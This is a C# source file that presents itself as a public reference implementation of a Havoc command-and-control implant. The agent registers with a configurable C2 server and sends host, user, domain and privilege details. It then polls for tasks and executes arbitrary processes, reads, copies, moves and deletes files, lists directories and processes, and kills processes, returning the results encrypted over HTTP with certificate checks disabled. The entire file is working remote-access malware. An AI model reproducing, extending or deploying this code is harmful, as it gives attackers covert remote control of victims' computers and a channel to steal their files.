/*
 * HavocAgent.cs  —  Public reference implementation
 *
 * Author:  Iron Hulk  (@IronHulk_0xff)
 *
 * Compile (C# 5, .NET 4.5+):
 *   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:agent.dll HavocAgent.cs
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;

public class Agent
{
    // ── Listener config ───────────────────────────────────────────────
    const string HOST  = "CHANGE_ME";      // C2 server IP or hostname
    const int    PORT  = 80;               // C2 listener port
    const bool   HTTPS = false;
    const string URI   = "/";
    const string UA    = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";

    // ── Protocol IDs ──────────────────────────────────────────────────
    const uint DEMON_MAGIC        = 0xDEADBEEF;  // stock Havoc magic — works with unmodified teamserver
    const uint CMD_INIT           = 99;
    const uint CMD_GETJOB         = 1;
    const uint CMD_NOJOB          = 10;
    const uint CMD_SLEEP          = 11;
    const uint CMD_PROC_LIST      = 12;
    const uint CMD_FS             = 15;
    const uint CMD_PROC           = 0x1010;
    const uint CMD_OUTPUT         = 90;
    const uint CMD_EXIT           = 92;

    // FS sub-commands
    const uint FS_DIR      = 1;
    // FS_DOWNLOAD = 2  — not implemented; implement chunked Open/Write/Close sequence yourself
    const uint FS_CD       = 4;
    const uint FS_REMOVE   = 5;
    const uint FS_MKDIR    = 6;
    const uint FS_CP       = 7;
    const uint FS_MV       = 8;
    const uint FS_PWD      = 9;
    const uint FS_CAT      = 10;

    // PROC sub-commands
    const uint PROC_CREATE = 4;
    const uint PROC_KILL   = 7;

    // ── Session state ─────────────────────────────────────────────────
    static uint   _id;
    static byte[] _key;
    static byte[] _iv;
    static string _url;
    static int    _sleepMs = 5000;
    static int    _jitter  = 10;

    // ─────────────────────────────────────────────────────────────────
    //  Entry point
    // ─────────────────────────────────────────────────────────────────
    public static void Start()
    {
        try
        {
            // Accepts any certificate — required for self-signed C2 certs; pin the cert for production use.
            ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        }
        catch { }

        _url = (HTTPS ? "https" : "http") + "://" + HOST + ":" + PORT + URI;

        _key = new byte[32]; _iv = new byte[16];
        using (var rng = new RNGCryptoServiceProvider()) { rng.GetBytes(_key); rng.GetBytes(_iv); }

        var rnd = new Random();
        _id = (uint)rnd.Next(0x100000, int.MaxValue);

        while (true)
        {
            try { if (Register()) break; }
            catch { }
            Thread.Sleep(15000);
        }

        while (true)
        {
            try   { CheckIn(); }
            catch { }
            int jMs = new Random().Next(0, (_sleepMs * _jitter) / 100);
            Thread.Sleep(_sleepMs + jMs);
        }
    }

    // ─────────────────────────────────────────────────────────────────
    //  Registration
    // ─────────────────────────────────────────────────────────────────
    static bool Register()
    {
        byte[] pkt  = BuildInitPacket();
        byte[] resp = HttpPost(pkt);
        if (resp == null || resp.Length < 4) return false;
        byte[] plain = AesCtr(resp, _key, _iv);
        return ReadLE32(plain, 0) == _id;
    }

    static byte[] BuildInitPacket()
    {
        byte[] payload = BuildInitPayload();
        byte[] enc     = AesCtr(payload, _key, _iv);
        var ms = new MemoryStream();
        WriteBE32(ms, 0); WriteBE32(ms, DEMON_MAGIC); WriteBE32(ms, _id);
        WriteBE32(ms, CMD_INIT); WriteBE32(ms, 0);
        ms.Write(_key, 0, 32); ms.Write(_iv, 0, 16);
        ms.Write(enc, 0, enc.Length);
        byte[] pkt = ms.ToArray();
        uint sz = (uint)(pkt.Length - 4);
        pkt[0]=(byte)(sz>>24); pkt[1]=(byte)(sz>>16); pkt[2]=(byte)(sz>>8); pkt[3]=(byte)sz;
        return pkt;
    }

    static byte[] BuildInitPayload()
    {
        string hostname = Dns.GetHostName();
        string username = Environment.UserName;
        string domain   = Environment.UserDomainName;
        string ip       = GetLocalIp();
        string proc     = GetProcessPath();
        int pid = Process.GetCurrentProcess().Id;
        int tid = (int)GetCurrentThreadId();
        int ppid = GetParentPid();
        uint  arch     = (uint)(IntPtr.Size == 8 ? 2 : 1);
        uint  elev     = IsElevated() ? 1u : 0u;
        ulong baseAddr = (ulong)Process.GetCurrentProcess().MainModule.BaseAddress.ToInt64();
        var   osv      = Environment.OSVersion.Version;

        var ms = new MemoryStream();
        WriteBE32(ms, _id);
        WriteBEStr(ms, hostname); WriteBEStr(ms, username);
        WriteBEStr(ms, domain);  WriteBEStr(ms, ip);
        WriteBEWStr(ms, proc);
        WriteBE32(ms, (uint)pid); WriteBE32(ms, (uint)tid); WriteBE32(ms, (uint)ppid);
        WriteBE32(ms, arch); WriteBE32(ms, elev); WriteBE64(ms, baseAddr);
        WriteBE32(ms, (uint)osv.Major); WriteBE32(ms, (uint)osv.Minor); WriteBE32(ms, 1);
        WriteBE32(ms, 0); WriteBE32(ms, (uint)osv.Build); WriteBE32(ms, 9);
        WriteBE32(ms, (uint)(_sleepMs/1000)); WriteBE32(ms, (uint)_jitter);
        WriteBE64(ms, 0UL); WriteBE32(ms, 0);
        return ms.ToArray();
    }

    // ─────────────────────────────────────────────────────────────────
    //  Check-in
    // ─────────────────────────────────────────────────────────────────
    static void CheckIn()
    {
        byte[] resp = HttpPost(BuildGetJobPacket());
        if (resp == null) return;

        int off = 0;
        while (off + 12 <= resp.Length)
        {
            uint cmd   = ReadLE32(resp, off); off += 4;
            uint reqId = ReadLE32(resp, off); off += 4;
            uint len   = ReadLE32(resp, off); off += 4;
            if (len > (uint)(resp.Length - off)) break;
            byte[] enc = new byte[len];
            if (len > 0) Array.Copy(resp, off, enc, 0, (int)len);
            off += (int)len;
            if (cmd == CMD_NOJOB) continue;
            byte[] data;
            if (len > 0)
            {
                // Stock Havoc teamserver encrypts tasks with fixed AesIv (no per-task nonce).
                data = AesCtr(enc, _key, _iv);
            }
            else { data = new byte[0]; }
            try { DispatchTask(cmd, reqId, data); }
            catch { }
        }
    }

    static byte[] BuildGetJobPacket()
    {
        var ms = new MemoryStream();
        WriteBE32(ms, 16); WriteBE32(ms, DEMON_MAGIC); WriteBE32(ms, _id);
        WriteBE32(ms, CMD_GETJOB); WriteBE32(ms, 0);
        return ms.ToArray();
    }

    // ─────────────────────────────────────────────────────────────────
    //  Task dispatch
    // ─────────────────────────────────────────────────────────────────
    static void DispatchTask(uint cmd, uint reqId, byte[] data)
    {
        switch (cmd)
        {
            case CMD_SLEEP:
                if (data.Length >= 4)
                    _sleepMs = (int)ReadLE32(data, 0) * 1000;
                if (data.Length >= 8)
                    _jitter  = (int)ReadLE32(data, 4);
                break;

            case CMD_EXIT:
                Environment.Exit(0);
                break;

            case CMD_FS:
                DispatchFs(reqId, data);
                break;

            case CMD_PROC:
                DispatchProc(reqId, data);
                break;

            case CMD_PROC_LIST:
                DispatchProcList(reqId, data);
                break;
        }
    }

    // ─────────────────────────────────────────────────────────────────
    //  COMMAND_FS (15)
    // ─────────────────────────────────────────────────────────────────
    static void DispatchFs(uint reqId, byte[] data)
    {
        if (data.Length < 4) return;
        uint sub = ReadLE32(data, 0);

        switch (sub)
        {
            // ── pwd ──
            case FS_PWD:
            {
                string cwd = Directory.GetCurrentDirectory();
                SendFsBlock(reqId, sub, ms => {
                    WriteU16String(ms, cwd);
                });
                break;
            }

            // ── cd ──
            case FS_CD:
            {
                int off = 4;
                string path = ReadLeUtf16(data, ref off);
                try
                {
                    if (!string.IsNullOrEmpty(path))
                        Directory.SetCurrentDirectory(path);
                    SendFsBlock(reqId, sub, ms => {
                        WriteU16String(ms, Directory.GetCurrentDirectory());
                    });
                }
                catch
                {
                    SendFsBlock(reqId, sub, ms => {
                        WriteU16String(ms, path);
                    });
                }
                break;
            }

            // ── mkdir ──
            case FS_MKDIR:
            {
                int off = 4;
                string path = ReadLeUtf16(data, ref off);
                try   { Directory.CreateDirectory(path); }
                catch { }
                SendFsBlock(reqId, sub, ms => {
                    WriteU16String(ms, path);
                });
                break;
            }

            // ── remove ──
            case FS_REMOVE:
            {
                int off = 4;
                string path = ReadLeUtf16(data, ref off);
                bool isDir = false;
                try
                {
                    if (Directory.Exists(path)) { Directory.Delete(path, true); isDir = true; }
                    else if (File.Exists(path))  { File.Delete(path); }
                }
                catch { }
                SendFsBlock(reqId, sub, ms => {
                    WriteBE32(ms, isDir ? 1u : 0u);
                    WriteU16String(ms, path);
                });
                break;
            }

            // ── cat ──
            case FS_CAT:
            {
                int off = 4;
                string fname = ReadLeUtf16(data, ref off);
                bool ok = false;
                byte[] content = new byte[0];
                try
                {
                    content = File.ReadAllBytes(fname);
                    ok = true;
                }
                catch { }
                SendFsBlock(reqId, sub, ms => {
                    WriteU16String(ms, fname);
                    WriteBE32(ms, ok ? 1u : 0u);
                    WriteBEBytes(ms, content);
                });
                break;
            }

            // ── cp ──
            case FS_CP:
            {
                int off = 4;
                string src = ReadLeUtf16(data, ref off);
                string dst = ReadLeUtf16(data, ref off);
                bool ok = false;
                try { File.Copy(src, dst, true); ok = true; }
                catch { }
                SendFsBlock(reqId, sub, ms => {
                    WriteBE32(ms, ok ? 1u : 0u);
                    WriteU16String(ms, src);
                    WriteU16String(ms, dst);
                });
                break;
            }

            // ── mv ──
            case FS_MV:
            {
                int off = 4;
                string src = ReadLeUtf16(data, ref off);
                string dst = ReadLeUtf16(data, ref off);
                bool ok = false;
                try { File.Move(src, dst); ok = true; }
                catch { }
                SendFsBlock(reqId, sub, ms => {
                    WriteBE32(ms, ok ? 1u : 0u);
                    WriteU16String(ms, src);
                    WriteU16String(ms, dst);
                });
                break;
            }

            // ── dir / explorer ──
            case FS_DIR:
            {
                int off = 4;
                uint explorer = (off + 4 <= data.Length) ? ReadLE32(data, off) : 0; off += 4;
                string rawPath = ReadLeUtf16(data, ref off);
                off += 4; off += 4; off += 4;
                uint listOnly = (off + 4 <= data.Length) ? ReadLE32(data, off) : 0; off += 4;

                if (rawPath.Length >= 2 && rawPath[0] == '.' && rawPath[1] == '\\')
                    rawPath = rawPath.Substring(2);

                string dirPath = rawPath.TrimEnd('*').TrimEnd('\\');

                if (dirPath == "." || string.IsNullOrEmpty(dirPath))
                {
                    string[] drives = Directory.GetLogicalDrives();
                    SendFsBlock(reqId, FS_DIR, ms => {
                        WriteBE32(ms, explorer);
                        WriteBE32(ms, 0u);
                        WriteU16String(ms, ".");
                        WriteBE32(ms, 1u);
                        WriteU16String(ms, ".\\" + "*");
                        WriteBE32(ms, 0u);
                        WriteBE32(ms, (uint)drives.Length);
                        WriteBE64(ms, 0UL);

                        foreach (string drive in drives)
                        {
                            string dname = drive.TrimEnd('\\');
                            WriteU16String(ms, dname);
                            WriteBE32(ms, 1u);
                            WriteBE64(ms, 0UL);
                            WriteBE32(ms, 1u);  WriteBE32(ms, 1u);  WriteBE32(ms, 2024u);
                            WriteBE32(ms, 0u);  WriteBE32(ms, 0u);
                        }
                    });
                    break;
                }

                if (!dirPath.EndsWith("\\")) dirPath += "\\";

                bool listOnlyBool = listOnly != 0;

                bool success = false;
                var fileList = new List<FileInfo>();
                var dirList  = new List<DirectoryInfo>();
                long totalSize = 0;
                try
                {
                    var di = new DirectoryInfo(dirPath);
                    foreach (var f in di.GetFiles()) { fileList.Add(f); totalSize += f.Length; }
                    foreach (var d in di.GetDirectories()) dirList.Add(d);
                    success = true;
                }
                catch { }

                bool isDriveRoot = dirPath.Length == 3 && char.IsLetter(dirPath[0])
                                   && dirPath[1] == ':' && dirPath[2] == '\\';
                string rootDirPath = isDriveRoot
                    ? (".\\" + dirPath.TrimEnd('\\') + "\\*")
                    : (dirPath + "*");

                SendFsBlock(reqId, FS_DIR, ms => {
                    WriteBE32(ms, explorer);
                    WriteBE32(ms, listOnly);
                    WriteU16String(ms, dirPath);
                    WriteBE32(ms, success ? 1u : 0u);

                    if (success)
                    {
                        WriteU16String(ms, rootDirPath);
                        WriteBE32(ms, (uint)fileList.Count);
                        WriteBE32(ms, (uint)dirList.Count);
                        if (!listOnlyBool)
                            WriteBE64(ms, (ulong)totalSize);

                        foreach (var d in dirList)
                        {
                            if (listOnlyBool)
                                WriteU16String(ms, dirPath + d.Name);
                            else
                            {
                                WriteU16String(ms, d.Name);
                                WriteBE32(ms, 1u);
                                WriteBE64(ms, 0UL);
                                var t = d.LastWriteTime;
                                WriteBE32(ms, (uint)t.Day);    WriteBE32(ms, (uint)t.Month);
                                WriteBE32(ms, (uint)t.Year);   WriteBE32(ms, (uint)t.Minute);
                                WriteBE32(ms, (uint)t.Hour);
                            }
                        }

                        foreach (var f in fileList)
                        {
                            if (listOnlyBool)
                                WriteU16String(ms, dirPath + f.Name);
                            else
                            {
                                WriteU16String(ms, f.Name);
                                WriteBE32(ms, 0u);
                                WriteBE64(ms, (ulong)f.Length);
                                var t = f.LastWriteTime;
                                WriteBE32(ms, (uint)t.Day);    WriteBE32(ms, (uint)t.Month);
                                WriteBE32(ms, (uint)t.Year);   WriteBE32(ms, (uint)t.Minute);
                                WriteBE32(ms, (uint)t.Hour);
                            }
                        }
                    }
                });
                break;
            }
        }
    }

    // Build a CMD_FS result packet
    static void SendFsBlock(uint reqId, uint sub, Action<MemoryStream> innerBuilder)
    {
        var inner = new MemoryStream();
        WriteBE32(inner, sub);
        innerBuilder(inner);
        byte[] innerBytes = inner.ToArray();

        var plain = new MemoryStream();
        WriteBE32(plain, (uint)innerBytes.Length);
        plain.Write(innerBytes, 0, innerBytes.Length);

        SendResultPacket(CMD_FS, reqId, plain.ToArray());
    }

    // ─────────────────────────────────────────────────────────────────
    //  COMMAND_PROC (0x1010)
    // ─────────────────────────────────────────────────────────────────
    static void DispatchProc(uint reqId, byte[] data)
    {
        if (data.Length < 4) return;
        uint sub = ReadLE32(data, 0);

        switch (sub)
        {
            case PROC_CREATE:
            {
                int off = 4;
                if (off + 4 > data.Length) return;
                /* state */ ReadLE32(data, off); off += 4;
                string proc = ReadLeUtf16(data, ref off);
                string args = ReadLeUtf16(data, ref off);
                int  spawnedPid;
                bool procStarted;
                byte[] output = RunProcess(proc, args, out spawnedPid, out procStarted);
                SendOutput(reqId, output);
                SendProcCreateResult(reqId, proc, spawnedPid, procStarted ? 1 : 0, 0, 0);
                break;
            }

            case PROC_KILL:
            {
                int off = 4;
                if (off + 4 > data.Length) return;
                int pid = (int)ReadLE32(data, off);
                bool ok = false;
                try { Process.GetProcessById(pid).Kill(); ok = true; }
                catch { }
                SendProcKillResult(reqId, pid, ok);
                break;
            }
        }
    }

    static void SendProcCreateResult(uint reqId, string path, int pid, int success, int piped, int verbose)
    {
        var inner = new MemoryStream();
        WriteBE32(inner, PROC_CREATE);
        WriteU16String(inner, path);
        WriteBE32(inner, (uint)pid);
        WriteBE32(inner, (uint)success);
        WriteBE32(inner, (uint)piped);
        WriteBE32(inner, (uint)verbose);
        byte[] innerBytes = inner.ToArray();

        var plain = new MemoryStream();
        WriteBE32(plain, (uint)innerBytes.Length);
        plain.Write(innerBytes, 0, innerBytes.Length);

        SendResultPacket(CMD_PROC, reqId, plain.ToArray());
    }

    static void SendProcKillResult(uint reqId, int pid, bool ok)
    {
        var inner = new MemoryStream();
        WriteBE32(inner, PROC_KILL);
        WriteBE32(inner, ok ? 1u : 0u);
        WriteBE32(inner, (uint)pid);
        byte[] innerBytes = inner.ToArray();

        var plain = new MemoryStream();
        WriteBE32(plain, (uint)innerBytes.Length);
        plain.Write(innerBytes, 0, innerBytes.Length);

        SendResultPacket(CMD_PROC, reqId, plain.ToArray());
    }

    // ─────────────────────────────────────────────────────────────────
    //  COMMAND_PROC_LIST (12)
    // ─────────────────────────────────────────────────────────────────
    static void DispatchProcList(uint reqId, byte[] data)
    {
        var inner = new MemoryStream();
        WriteBE32(inner, 0);  // ProcessUI = FALSE

        foreach (var p in Process.GetProcesses())
        {
            try
            {
                string name = p.ProcessName;
                int    pid  = p.Id;
                int    ppid = GetParentPidOf(p);
                int    sess = p.SessionId;
                int    thrs = p.Threads.Count;
                string user = GetProcessUser(p);

                WriteU16String(inner, name);
                WriteBE32(inner, (uint)pid);
                WriteBE32(inner, GetIsWow64(p) ? 1u : 0u);
                WriteBE32(inner, (uint)ppid);
                WriteBE32(inner, (uint)sess);
                WriteBE32(inner, (uint)thrs);
                WriteU16String(inner, user);
            }
            catch { }
        }

        byte[] innerBytes = inner.ToArray();
        var plain = new MemoryStream();
        WriteBE32(plain, (uint)innerBytes.Length);
        plain.Write(innerBytes, 0, innerBytes.Length);

        SendResultPacket(CMD_PROC_LIST, reqId, plain.ToArray());
    }

    // ─────────────────────────────────────────────────────────────────
    //  DEMON_OUTPUT (90)
    //  Wire: [SIZE 4BE][MAGIC 4BE][ID 4BE][CMD=90 4BE][REQID 4BE]
    //        AES-CTR([OUTER 4BE][INNER 4BE][bytes])
    // ─────────────────────────────────────────────────────────────────
    static void SendOutput(uint reqId, byte[] output)
    {
        uint len = (uint)output.Length;
        var plain = new MemoryStream();
        WriteBE32(plain, 4 + len);  // OUTER
        WriteBE32(plain, len);      // INNER
        plain.Write(output, 0, output.Length);
        SendResultPacket(CMD_OUTPUT, reqId, plain.ToArray());
    }

    // ─────────────────────────────────────────────────────────────────
    //  Generic result packet builder
    //  Wire: [SIZE 4BE][MAGIC 4BE][ID 4BE][CMD 4BE plaintext]
    //        [REQID 4BE plaintext][AES-CTR(aesPlain)]
    // ─────────────────────────────────────────────────────────────────
    static void SendResultPacket(uint cmd, uint reqId, byte[] aesPlain)
    {
        byte[] enc = AesEncrypt(aesPlain);
        var ms = new MemoryStream();
        WriteBE32(ms, 0);            // SIZE placeholder
        WriteBE32(ms, DEMON_MAGIC);
        WriteBE32(ms, _id);
        WriteBE32(ms, cmd);          // plaintext CMD
        WriteBE32(ms, reqId);        // plaintext REQID
        ms.Write(enc, 0, enc.Length);
        byte[] pkt = ms.ToArray();
        uint sz = (uint)(pkt.Length - 4);
        pkt[0]=(byte)(sz>>24); pkt[1]=(byte)(sz>>16); pkt[2]=(byte)(sz>>8); pkt[3]=(byte)sz;
        HttpPost(pkt);
    }

    // ─────────────────────────────────────────────────────────────────
    //  Process execution
    // ─────────────────────────────────────────────────────────────────
    const int SHELL_TIMEOUT_MS = 30000;

    static byte[] RunProcess(string exe, string args, out int pid, out bool started)
    {
        pid = 0; started = false;
        try
        {
            var psi = new ProcessStartInfo(exe, args);
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError  = true;
            psi.UseShellExecute        = false;
            psi.CreateNoWindow         = true;
            var p = Process.Start(psi);
            pid = p.Id;
            started = true;

            string o = "", e = "";
            var outThread = new Thread(() => { try { o = p.StandardOutput.ReadToEnd(); } catch { } });
            var errThread = new Thread(() => { try { e = p.StandardError.ReadToEnd();  } catch { } });
            outThread.IsBackground = true;
            errThread.IsBackground = true;
            outThread.Start();
            errThread.Start();

            bool exited = p.WaitForExit(SHELL_TIMEOUT_MS);
            if (!exited) { try { p.Kill(); } catch { } }

            outThread.Join(5000);
            errThread.Join(5000);

            string suffix = exited ? "" : "\r\n[shell timed out after 30s — process killed]\r\n";
            return Encoding.UTF8.GetBytes(o + (e.Length > 0 ? "\r\n[stderr]\r\n" + e : "") + suffix);
        }
        catch (Exception ex) { return Encoding.UTF8.GetBytes("[error] " + ex.Message + "\r\n"); }
    }

    // ─────────────────────────────────────────────────────────────────
    //  HTTP POST
    // ─────────────────────────────────────────────────────────────────
    static byte[] HttpPost(byte[] body)
    {
        try
        {
            var req = (HttpWebRequest)WebRequest.Create(_url);
            req.Method = "POST"; req.ContentType = "application/octet-stream";
            req.ContentLength = body.Length; req.UserAgent = UA;
            req.Timeout = 30000; req.KeepAlive = false;
            using (var s = req.GetRequestStream()) s.Write(body, 0, body.Length);
            using (var resp = (HttpWebResponse)req.GetResponse())
            using (var ms   = new MemoryStream())
            { resp.GetResponseStream().CopyTo(ms); return ms.ToArray(); }
        }
        catch { return null; }
    }

    // ─────────────────────────────────────────────────────────────────
    //  AES-256-CTR (must match teamserver crypt/aes.go behaviour)
    // ─────────────────────────────────────────────────────────────────

    // Encrypt: AES-CTR with fixed session IV (stock teamserver uses fixed IV, no per-task nonce).
    static byte[] AesEncrypt(byte[] data)
    {
        return AesCtr(data, _key, _iv);
    }

    // NOTE: counter resets to IV on every call — intentional to match teamserver behaviour.
    static byte[] AesCtr(byte[] data, byte[] key, byte[] iv)
    {
        byte[] result  = new byte[data.Length];
        byte[] counter = (byte[])iv.Clone();
        int    off     = 0;
        while (off < data.Length)
        {
            byte[] ks;
            using (var aes = Aes.Create())
            {
                aes.Mode    = CipherMode.ECB;
                aes.Padding = PaddingMode.None;
                aes.Key     = key;
                ks = aes.CreateEncryptor().TransformFinalBlock(counter, 0, 16);
            }
            int n = Math.Min(16, data.Length - off);
            for (int i = 0; i < n; i++) result[off+i] = (byte)(data[off+i] ^ ks[i]);
            off += n;
            for (int i = counter.Length-1; i >= 0; i--)
                if (++counter[i] != 0) break;
        }
        return result;
    }

    // ─────────────────────────────────────────────────────────────────
    //  Write helpers  (big-endian, agent → server direction)
    // ─────────────────────────────────────────────────────────────────
    static void WriteBE32(Stream s, uint v)
    { s.WriteByte((byte)(v>>24)); s.WriteByte((byte)(v>>16)); s.WriteByte((byte)(v>>8)); s.WriteByte((byte)v); }

    static void WriteBE64(Stream s, ulong v)
    { WriteBE32(s,(uint)(v>>32)); WriteBE32(s,(uint)(v&0xFFFFFFFFu)); }

    static void WriteBEStr(Stream s, string str)
    { byte[] b=Encoding.ASCII.GetBytes(str); WriteBE32(s,(uint)b.Length); s.Write(b,0,b.Length); }

    static void WriteBEWStr(Stream s, string str)
    { byte[] b=Encoding.Unicode.GetBytes(str); WriteBE32(s,(uint)b.Length); s.Write(b,0,b.Length); }

    // WriteU16String: [LEN_BE 4][UTF-16LE bytes]
    static void WriteU16String(Stream s, string str)
    { byte[] b=Encoding.Unicode.GetBytes(str); WriteBE32(s,(uint)b.Length); s.Write(b,0,b.Length); }

    // WriteBEBytes: [LEN_BE 4][bytes]
    static void WriteBEBytes(Stream s, byte[] data)
    { WriteBE32(s,(uint)data.Length); s.Write(data,0,data.Length); }

    // ─────────────────────────────────────────────────────────────────
    //  Read helpers  (little-endian, server → agent direction)
    // ─────────────────────────────────────────────────────────────────
    static uint ReadLE32(byte[] b, int o)
    { return (uint)(b[o]|(b[o+1]<<8)|(b[o+2]<<16)|(b[o+3]<<24)); }

    static string ReadLeUtf16(byte[] buf, ref int off)
    {
        if (off+4 > buf.Length) return "";
        uint len = ReadLE32(buf, off); off += 4;
        if (len == 0) return "";
        if (off+(int)len > buf.Length) len = (uint)(buf.Length-off);
        string s = Encoding.Unicode.GetString(buf, off, (int)len).TrimEnd('\0');
        off += (int)len;
        return s;
    }

    // ─────────────────────────────────────────────────────────────────
    //  System helpers
    // ─────────────────────────────────────────────────────────────────
    static string GetLocalIp()
    {
        try
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
                if (ni.OperationalStatus    != OperationalStatus.Up)          continue;
                foreach (var ua in ni.GetIPProperties().UnicastAddresses)
                    if (ua.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        return ua.Address.ToString();
            }
        }
        catch { }
        return "127.0.0.1";
    }

    static string GetProcessPath()
    {
        try   { return Process.GetCurrentProcess().MainModule.FileName; }
        catch { return Environment.GetCommandLineArgs()[0]; }
    }

    static string GetProcessUser(Process p)
    {
        try
        {
            IntPtr hToken;
            if (!OpenProcessToken(p.Handle, 0x0008, out hToken)) return "";
            int sz = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, 0, ref sz);
            IntPtr buf = Marshal.AllocHGlobal(sz);
            try
            {
                if (!GetTokenInformation(hToken, 1, buf, sz, ref sz)) return "";
                IntPtr sid = Marshal.ReadIntPtr(buf);
                IntPtr name = IntPtr.Zero, dom = IntPtr.Zero;
                int nSz = 0, dSz = 0, use = 0;
                LookupAccountSid(null, sid, IntPtr.Zero, ref nSz, IntPtr.Zero, ref dSz, ref use);
                name = Marshal.AllocHGlobal(nSz * 2);
                dom  = Marshal.AllocHGlobal(dSz * 2);
                try
                {
                    if (!LookupAccountSid(null, sid, name, ref nSz, dom, ref dSz, ref use)) return "";
                    return Marshal.PtrToStringUni(dom) + "\\" + Marshal.PtrToStringUni(name);
                }
                finally { Marshal.FreeHGlobal(name); Marshal.FreeHGlobal(dom); }
            }
            finally { Marshal.FreeHGlobal(buf); CloseHandle(hToken); }
        }
        catch { return ""; }
    }

    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tk);
    [DllImport("advapi32.dll")] static extern bool GetTokenInformation(IntPtr tk, int cls, IntPtr buf, int sz, ref int ret);
    [DllImport("advapi32.dll", CharSet=CharSet.Auto)] static extern bool LookupAccountSid(string sys, IntPtr sid, IntPtr name, ref int nSz, IntPtr dom, ref int dSz, ref int use);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);

    static int GetParentPidOf(Process p)
    {
        try
        {
            var pbi = new PROCESS_BASIC_INFORMATION();
            int ret = 0;
            NtQueryInformationProcess(p.Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
            return pbi.InheritedFromUniqueProcessId.ToInt32();
        }
        catch { return 0; }
    }

    static bool IsElevated()
    {
        try
        {
            using (var id = WindowsIdentity.GetCurrent())
                return new WindowsPrincipal(id).IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    [DllImport("kernel32.dll")] static extern bool IsWow64Process(IntPtr hProcess, out bool isWow64);

    static bool GetIsWow64(Process p)
    {
        try { bool wow; return IsWow64Process(p.Handle, out wow) && wow; }
        catch { return false; }
    }

    [DllImport("kernel32")] static extern uint GetCurrentThreadId();

    static int GetParentPid()
    {
        try
        {
            var pbi = new PROCESS_BASIC_INFORMATION();
            int ret = 0;
            NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
            return pbi.InheritedFromUniqueProcessId.ToInt32();
        }
        catch { return 0; }
    }

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(
        IntPtr hProcess, int processInfoClass,
        ref PROCESS_BASIC_INFORMATION pbi, int size, ref int returnLength);

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1, PebBaseAddress, Reserved2_0, Reserved2_1;
        public IntPtr UniqueProcessId, InheritedFromUniqueProcessId;
    }

    public static void Main(string[] args) { Start(); }
}
